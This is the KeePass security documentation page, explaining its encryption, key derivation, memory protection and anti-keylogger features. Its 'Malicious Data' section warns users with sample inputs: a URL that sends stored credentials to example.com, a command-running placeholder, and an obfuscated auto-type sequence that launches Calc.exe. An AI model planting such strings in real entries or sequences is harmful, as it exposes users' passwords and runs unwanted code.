<!-- Source: https://keepass.info/help/base/security.html -->

# Security

Detailed information on the security of KeePass.

- [Database Encryption](https://keepass.info/help/base/security.html#secencrypt)
- [Key Hashing and Key Derivation](https://keepass.info/help/base/security.html#seckeyhash)
- [Protection against Dictionary Attacks](https://keepass.info/help/base/security.html#secdictprotect)
- [Random Number Generation](https://keepass.info/help/base/security.html#secrandom)
- [Process Memory Protection](https://keepass.info/help/base/security.html#secmemprot)
- [Enter Master Key on Secure Desktop (Protection against Keyloggers)](https://keepass.info/help/base/security.html#secdesktop)
- [Locking the Workspace](https://keepass.info/help/base/security.html#seclocking)
- [Viewing/Editing Attachments](https://keepass.info/help/base/security.html#secattach)
- [Plugins](https://keepass.info/help/base/security.html#secplugins)
- [Self-Tests](https://keepass.info/help/base/security.html#secselftests)
- [Specialized Spyware](https://keepass.info/help/base/security.html#secspecattacks)
- [Malicious Data](https://keepass.info/help/base/security.html#secmaldata)
- [Options for Experts](https://keepass.info/help/base/security.html#secoptex)
- [Options for Administrators](https://keepass.info/help/base/security.html#secoptadm)
- [Security Issues](https://keepass.info/help/base/security.html#secissues)

## Database Encryption

KeePass database files are encrypted. KeePass encrypts the whole database, i.e. not only your passwords, but also your user names, URLs, notes, etc.

The following encryption algorithms are supported:

KeePass 1.x:

| Algorithm | Key Size | Std. / Ref. |
| --- | --- | --- |
| Advanced Encryption Standard (AES / Rijndael) | 256 bits | [NIST FIPS 197](https://csrc.nist.gov/pubs/fips/197/final) |
| Twofish | 256 bits | [Info](https://www.schneier.com/academic/twofish/) |

KeePass 2.x:

| Algorithm | Key Size | Std. / Ref. |
| --- | --- | --- |
| Advanced Encryption Standard (AES / Rijndael) | 256 bits | [NIST FIPS 197](https://csrc.nist.gov/pubs/fips/197/final) |
| ChaCha20 | 256 bits | [RFC 8439](https://datatracker.ietf.org/doc/html/rfc8439) |
| There exist various [plugins](https://keepass.info/plugins.html) that provide support for additional encryption algorithms, including but not limited to Twofish, Serpent and GOST. |

These well-known and thoroughly analyzed algorithms are considered to be very secure. AES (Rijndael) became effective as a U.S. federal government standard and is approved by the National Security Agency (NSA) for top secret information. Twofish was one of the other four AES finalists. ChaCha20 is the successor of the Salsa20 algorithm (which is included in the [eSTREAM portfolio](https://www.ecrypt.eu.org/stream/)).

The block ciphers are used in the Cipher Block Chaining (CBC) [block cipher mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation). In CBC mode, plaintext patterns are concealed.

An [initialization vector](https://en.wikipedia.org/wiki/Initialization_vector) (IV) is generated [randomly](https://keepass.info/help/base/security.html#secrandom) each time a database is saved. Thus, multiple databases encrypted with the same master key (e.g. backups) are no problem.

Data authenticity and integrity:

See also:

- [KDBX file format specification](https://keepass.info/help/kb/kdbx.html).
- [FIPS mode support](https://keepass.info/help/base/faq_tech.html#fips2x).

## Key Hashing and Key Derivation

SHA-256 is used for compressing the components of the [master key](https://keepass.info/help/base/keys.html) (consisting of a master password, a key file, a Windows user account key and/or a key provided by a plugin) to a 256-bit key *K*.

SHA-256 is a cryptographic hash function that is considered to be very secure. It has been designed by the National Security Agency (NSA), and has been standardized in [NIST FIPS 180-4](https://dx.doi.org/10.6028/NIST.FIPS.180-4). The [attack against SHA-1](https://www.schneier.com/blog/archives/2005/02/cryptanalysis_o.html) discovered in 2005 does not affect the security of SHA-256.

In order to generate the key for the encryption algorithm, *K* is transformed using a key derivation function (with a random salt). This prevents precomputation of keys and makes dictionary and guessing attacks harder. For details, see the section '[Protection against Dictionary Attacks](https://keepass.info/help/base/security.html#secdictprotect)'.

## Protection against Dictionary Attacks

KeePass features a protection against dictionary and guessing attacks.

Such attacks cannot be prevented, but they can be made harder. For this, the key *K* derived from the user's master key (see [above](https://keepass.info/help/base/security.html#seckeyhash)) is transformed using a key derivation function with a random salt. This prevents a precomputation of keys and adds a work factor that the user can make as large as desired to increase the computational effort of a dictionary or guessing attack.

Multiple key derivation functions are supported. In the database settings dialog, you can select one and specify certain parameters for it.

By clicking the '1 Second Delay' button in the database settings dialog, KeePass computes the number of iterations that results in a 1 second delay when loading/saving a database. Furthermore, KeePass 2.x has a button 'Test' that performs a key transformation with the specified parameters (which can be cancelled) and reports the required time.

The key transformation may require more or less time on other devices. If you are using KeePass or a port of it on other devices, make sure that all devices are fast enough (and have sufficient memory) to load the database with your parameters within an acceptable time.

Supported key derivation functions:

- **AES-KDF** (KeePass 1.x and 2.x): This key derivation function is based on iterating AES. This key derivation function splits <em>K</em> into two 128-bit halves (the block size of AES is 128 bits) and iteratively encrypts them using AES with a random 256-bit key (transformation salt). The key derivation is finalized using one SHA-256 computation that combines the two halves. In the database settings dialog, you can change the number of iterations. The more iterations, the harder are dictionary and guessing attacks, but also database loading/saving takes more time (linearly). On Windows Vista and higher, KeePass can use Windows' CNG/BCrypt API for the key transformation, which is about 50% faster than the key transformation code built-in to KeePass.
- **Argon2** (KeePass 2.x only): [Argon2](https://github.com/P-H-C/phc-winner-argon2#argon2) is the winner of the [Password Hashing Competition](https://www.password-hashing.net/). The main advantage of Argon2 over AES-KDF is that it provides a better resistance against GPU/ASIC attacks (due to being a memory-hard function). The official specification of the Argon2 algorithm defines three variants: Argon2d, Argon2id and Argon2i. Argon2i is the least suitable variant in our case (KeePass database file); therefore, KeePass only offers Argon2d and Argon2id. Argon2d provides the best resistance against GPU/ASIC attacks. The resistance of Argon2id against GPU/ASIC attacks is somewhat weaker, but Argon2id additionally makes certain side-channel attacks slightly harder. Side-channel attacks try to gain information from a system by observing its behavior (e.g. the duration and the power consumption of certain operations). On servers, side-channel attacks are a real threat. On client devices (PCs), side-channel attacks are more difficult (more noise, etc.); there are ideas how some might work in theory, but we are not aware of any real attack in practice. For example, the attack described in the article '[The Spy in the Sandbox / Side-Channel Attacks in Web Browsers](https://www.cs.columbia.edu/2015/spy-in-the-sandbox/)' was interesting (JavaScript code was able to detect certain user interactions), but not a real threat (no extraction of sensitive data, as mentioned explicitly in the article). This may or may not change in the future. Note that this has nothing to do with cloud storage; KeePass encrypts/decrypts a database file on a client device, and thus it is irrelevant where the database file is stored (for side-channel attacks). Furthermore, there are side-channel attacks that neither Argon2d nor Argon2id (nor Argon2i, nor any other key derivation function) protects against (e.g. [Spectre](https://en.wikipedia.org/wiki/Spectre_(security_vulnerability))/[Meltdown](https://en.wikipedia.org/wiki/Meltdown_(security_vulnerability)) side-channel attacks, which allow spyware to read all memory). In the case of KeePass, we currently recommend Argon2d instead of Argon2id, because we believe that a better protection against a really existing threat (password cracking using GPUs/ASICs is state of the art) is more important than a protection against certain side-channel attacks that may or may not become a problem on client devices in the future. If you worry about side-channel attacks (and are willing to sacrifice some GPU/ASIC resistance) or if you are developing a software where side-channel attacks could be a problem (e.g. a server service that operates with KeePass database files), use Argon2id. Side note: the IRTF CFRG Argon2 Internet standard recommends Argon2id by default. For server applications, Argon2id is in general indeed more suitable than Argon2d, but our situation (client device) is different, as mentioned above. The number of iterations scales linearly with the required time. By increasing the memory parameter, GPU/ASIC attacks become harder (and the required time increases). The parallelism parameter specifies how many threads should be used. We recommend the following procedure for determining the Argon2 parameters: When clicking the '1 Second Delay' button, KeePass uses a different strategy for determining the parameters (relatively low values for the memory and parallelism parameters, relatively high number of iterations), because KeePass does not know the RAM and processor details of your other devices (the default values should be compatible with most devices). If you know these details, it is recommended to follow the procedure above instead.
  1. Set the number of iterations to 2.
  2. Find out the RAM size of each of your devices on which you want to open your database file. Let *M* be the minimum of these sizes. Set the memory parameter to min(*M*/2, 1 GB) (i.e. use the half of *M*, if it is less than 1 GB, otherwise use 1 GB). On Windows 10 and higher, the RAM size can be found in the system settings → 'System' → 'About'.
    - Example 1: if you have a PC with 32 GB RAM and a mobile phone with 1 GB RAM (on which you want to open your database file), set the memory parameter to 500 MB.
    - Example 2: if you have a PC with 32 GB RAM and a PC with 8 GB RAM, set the memory parameter to 1 GB.
  3. Find out the number of logical processors of each of your devices. Set the parallelism parameter to the minimum of these numbers. On Windows 10 and higher, the number of logical processors can be found in the Task Manager (right-click onto the taskbar → 'Task Manager') on the 'Performance' tab page.
  4. Click the 'Test' button.
    - If the key transformation takes too much time (longer than you are willing to wait when opening/saving the database file, e.g. more than 1 second), cancel it, decrease the memory parameter and click the 'Test' button again. Repeat this until the required time is acceptable.
    - If the key transformation takes too few time (in the case of 1 GB memory), increase the number of iterations and click the 'Test' button again. Repeat this until you like the required time.
  5. Save the database file and try to open it on each of your other devices. If this takes too long on one of the devices, decrease the number of iterations (recommendation: not less than 2) and/or decrease the memory parameter, and try it again.

**Argon2 on iOS.** If you are using a KeePass-compatible app on iOS, please note the following limitation of iOS. If the app uses a lot of RAM (e.g. due to using Argon2 with a large memory parameter), then AutoFill may not work. In this case, we recommend to use a relatively low value for the Argon2 memory parameter (64 MB or less, depending on the app and the database size) and a relatively high number of iterations.

**KeePassX.** In contrast to KeePass, the Linux port KeePassX only partially supports protection against dictionary and guessing attacks.

## Random Number Generation

KeePass first creates an entropy pool using various entropy sources (including random numbers generated by the system cryptographic provider, current date/time and uptime, cursor position, operating system version, processor count, environment variables, process and memory statistics, current culture, a new random GUID, etc.).

The random bits for the high-level generation methods are generated using a cryptographically secure pseudo-random number generator (based on SHA-256/SHA-512 and ChaCha20) that is initialized using the entropy pool.

## Process Memory Protection

While KeePass is running, sensitive data is stored encryptedly in the process memory. This means that even if you would dump the KeePass process memory to disk, you could not find any sensitive data. For performance reasons, the process memory protection only applies to sensitive data; sensitive data here includes for instance the master key and entry passwords, but not user names, notes and file attachments. Note that this has nothing to do with the [encryption of database files](https://keepass.info/help/base/security.html#secencrypt); in database files, all data (including user names, etc.) is encrypted.

Furthermore, KeePass erases all security-critical memory (if possible) when it is not needed anymore, i.e. it overwrites these memory areas before releasing them.

KeePass uses the Windows DPAPI for encrypting sensitive data in memory https://msdn.microsoft.com/en-us/library/windows/desktop/aa380262.aspx https://docs.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory (via [CryptProtectMemory](https://learn.microsoft.com/en-us/windows/win32/api/dpapi/nf-dpapi-cryptprotectmemory) / https://msdn.microsoft.com/en-us/library/system.security.cryptography.protectedmemory.aspx https://docs.microsoft.com/en-us/dotnet/api/system.security.cryptography.protectedmemory [ProtectedMemory](https://learn.microsoft.com/en-us/dotnet/api/system.security.cryptography.protectedmemory)). With DPAPI, the key for the memory encryption is stored in a secure, non-swappable memory area managed by Windows. DPAPI is available on Windows 2000 and higher. KeePass 2.x always uses DPAPI if it is available; in KeePass 1.x, it can be disabled (in the advanced options; DPAPI usage is enabled by default). If DPAPI is unavailable or disabled, KeePass falls back to encrypting the process memory using ChaCha20 with a random key; note that this is less secure than DPAPI, because the key is also stored in swappable process memory. On Unix-like systems, KeePass 2.x uses ChaCha20, because Mono does not provide any effective memory protection method.

For some operations, KeePass must make sensitive data available unencryptedly in the process memory. For example, in order to show a password in the standard list view control provided by Windows, KeePass must supply the cell content (the password) as unencrypted string (unless hiding using asterisks is enabled). Operations that result in unencrypted data in the process memory include, but are not limited to: displaying data (not asterisks) in standard controls, transferring data to/from other applications (via the clipboard, drag&drop, StdIn/StdOut, ...), replacing placeholders (e.g. during auto-type), searching data (e.g. the commands in the 'Find' menu that involve sensitive data), importing/exporting files (except KDBX) and loading/saving unencrypted files. Windows and .NET may make copies of the data (in the process memory) that cannot be erased by KeePass.

## Enter Master Key on Secure Desktop (Protection against Keyloggers)

KeePass 2.x has an option (in 'Tools' → 'Options' → tab 'Security') to show master key dialogs on a different/secure desktop (supported on Windows 2000 and higher), similar to Windows' User Account Control (UAC). Almost no keylogger works on a secure desktop.

The option is turned off by default for compatibility reasons.

More information can be found on the [Secure Desktop](https://keepass.info/help/kb/sec_desk.html) help page.

*Note: KeePass was one of the first password managers that allow entering the master key on a different/secure desktop!*

## Locking the Workspace

When locking the workspace, KeePass closes the database file and only remembers its path and certain view parameters.

This provides maximum security: unlocking the workspace is as hard as opening the database file the normal way. Also, it prevents data loss (the computer can crash while KeePass is locked, without doing any damage to the database).

When a sub-dialog is open, the workspace may not be locked; for details, see the [FAQ](https://keepass.info/help/base/faq_tech.html#noautolock).

## Viewing/Editing Attachments

KeePass 2.x has an internal viewer/editor for attachments. For details how to use it for working with texts, see '[How to store and work with large amounts of (formatted) text?](https://keepass.info/help/base/faq_tech.html#rtftext)'.

The internal viewer/editor works with the data in main memory. It does not extract/store the data onto disk.

When trying to open an attachment that the internal viewer/editor cannot handle (e.g. a PDF file), KeePass extracts the attachment to a (EFS-encrypted) temporary file and opens it using the default application associated with this file type. After finishing viewing/editing, the user can choose between importing or discarding any changes made to the temporary file. In any case, KeePass afterwards securely deletes the temporary file (including overwriting it).

## Plugins

Separate pages exist about the security of plugins: [Plugin Security (KeePass 1.x)](https://keepass.info/help/v1/plugins.html), [Plugin Security (KeePass 2.x)](https://keepass.info/help/v2/plugins.html).

## Self-Tests

Each time you start KeePass, the program performs a quick self-test to see whether the encryption and hash algorithms work correctly and pass their test vectors. If one of the algorithms does not pass its test vectors, KeePass shows a security exception dialog.

## Specialized Spyware

This section gives answers to questions like the following:

- Would encrypting the configuration file increase security by preventing changes by a malicious program?
- Would encrypting the application (executable file, eventually together with the configuration file) increase security by preventing changes by a malicious program?
- Would an option to prevent plugins from being loaded increase security?
- Would storing security options in the database (to override the settings of the KeePass instance) increase security?
- Would locking the main window in such a way that only auto-type is allowed increase security?

The answer to all these questions is: no. Adding any of these features would not increase security.

All security features in KeePass protect against *generic* threats like keyloggers, clipboard monitors, password control monitors, etc. (and against non-runtime attacks on the database, memory dump analyzers, ...). However in all the questions above we are assuming that there is a spyware program running on the system that is specialized on attacking KeePass.

In this situation, the best security features will fail. This is law #1 of the https://technet.microsoft.com/en-us/library/cc722487.aspx https://technet.microsoft.com/en-us/library/hh278941.aspx [Ten Immutable Laws of Security](https://web.archive.org/web/20180529154650/https://technet.microsoft.com/en-us/library/hh278941.aspx) (Microsoft TechNet article; see also the Microsoft TechNet article https://technet.microsoft.com/en-us/library/2008.10.securitywatch.aspx https://docs.microsoft.com/en-us/previous-versions/technet-magazine/cc895640(v=msdn.10) [Revisiting the 10 Immutable Laws of Security, Part 1](https://learn.microsoft.com/en-us/previous-versions/technet-magazine/cc895640(v=msdn.10))): *"If a bad guy can persuade you to run his program on your computer, it's not your computer anymore"*.

For example, consider the following very simple spyware specialized for KeePass: an application that waits for KeePass to be started, then hides the started application and imitates KeePass itself. All interactions (like entering a password for decrypting the configuration, etc.) can be simulated. The only way to discover this spyware is to use a program that the spyware does not know about or cannot manipulate (secure desktop); in any case it cannot be KeePass.

For protecting your PC, we recommend using an anti-virus software. Use a proper firewall, only run software from trusted sources, do not open unknown e-mail attachments, etc.

## Malicious Data

The user should check all data that he enters and/or runs.

If you enter/run data without checking it first, this can lead to security problems (like for instance a disclosure of sensitive data or an execution of malicious code). This is a general principle; it applies to most applications, not only to KeePass.

Examples:

- The [URL field](https://keepass.info/help/base/autourl.html) of an entry supports running a [command line](https://keepass.info/help/base/autourl.html#cmdln). So, if you (enter and) run a URL without checking it first, you might run a malicious program/code.
- When running a URL, a malicious [URL override](https://keepass.info/help/base/autourl.html#override) (global or entry-specific) may be executed instead, if you did not check it.
- KeePass supports [placeholders](https://keepass.info/help/base/placeholders.html). All regular placeholders are of the form '`{...}`', and [environment variables](https://keepass.info/help/base/placeholders.html#envvars) are of the form '`%...%`'. All data should be checked for malicious placeholders and environment variables. [Text transformation placeholders](https://keepass.info/help/base/placeholders.html#texttrf) may be used to obfuscate parts of the data.
  - [Field references](https://keepass.info/help/base/fieldrefs.html) can insert data of other entries into the current data. For example, if you have a Facebook account, entering and running the following URL might send your Facebook user name and the password to the 'example.com' server: `https://example.com/?u={REF:U@T:Facebook}&p={REF:P@T:Facebook}`
  - The [`{CMD:...}` placeholder](https://keepass.info/help/base/placeholders.html#cmd) runs a command line. For example, the following URL opens 'https://example.com/' and runs 'Calc.exe': `https://example.com/{CMD:/Calc.exe/W=0/}`
- The following [auto-type](https://keepass.info/help/base/autotype.html) sequence performs a login and additionally runs 'Calc.exe': `{USERNAME}{TAB}{PASSWORD}{ENTER}{VKEY 91}{T-CONV:/%43%61%6C%63%2E%65%78%65/Uri-Dec/}{VKEY 13}` This sequence typically only works on a Windows system, but similar sequences can be constructed for other operating systems (like Linux and MacOS).
- If you specify weak [key transformation](https://keepass.info/help/base/security.html#secdictprotect) settings suggested by an attacker, this might make it easier for the attacker to decrypt/open your database.
- If you enter/use a [password generator](https://keepass.info/help/base/pwgenerator.html) profile (suggested by an attacker) that allows weak passwords only, accounts using such weak passwords may not be well protected.
- Using the [XML Replace](https://keepass.info/help/v2/xml_replace.html) feature with malicious parameters may result in a malicious modification of data in your database.
- Pasting/entering malicious [triggers](https://keepass.info/help/v2/triggers.html) in the triggers dialog without checking them can result in security problems.

If the user checks the data that he enters/runs, none of the "attacks" above works. Entering data is a manual operation (i.e. an attacker cannot do this himself), and only the user can decide whether the resulting effect is intended or not. Showing warning/confirmation dialogs all the time would not be reasonable.

When opening a database that has been created/modified by someone else, you should carefully check all data that you want to use. If you do not fully trust the creator of the database, do not open any files attached to entries.

## Options for Experts

Most security options can be configured in the options dialog of KeePass (menu 'Tools' → 'Options') and in the database settings dialog (menu 'File' → 'Database Settings').

However, in KeePass 2.x, there additionally are a few security options for experts that cannot be configured in the user interface. For example, KeePass can protect its process with a discretionary access control list (DACL). , and its windows can be protected against certain screen capture operations [This is a regular option now].

Activating these options for experts may result in compatibility problems and may make KeePass unusable. Therefore, these options can only be activated by editing the configuration file manually (using an XML or text editor). This ensures that users know how they can deactivate the problematic options (by editing the configuration file once more) in order to make KeePass usable again.

If you know how the [configuration](https://keepass.info/help/base/configuration.html) system of KeePass works, then see the [customization](https://keepass.info/help/v2_dev/customize.html#opt) help page, on which these options are documented.

## Options for Administrators

Administrators can enforce certain settings, disallow certain functions, specify requirements for master passwords, and much more. Details can be found on the following help pages:

- [Configuration](https://keepass.info/help/base/configuration.html).
- [Enforced Configuration](https://keepass.info/help/kb/config_enf.html).
- [Customization (KeePass 2.x)](https://keepass.info/help/v2_dev/customize.html), [Customization (KeePass 1.x)](https://keepass.info/help/v1_dev/customize.html).
- [Application Policy (KeePass 2.x)](https://keepass.info/help/v2/policy.html).

## Security Issues

For a list of security issues, their status and clarifications, please see the page [Security Issues](https://keepass.info/help/kb/sec_issues.html).
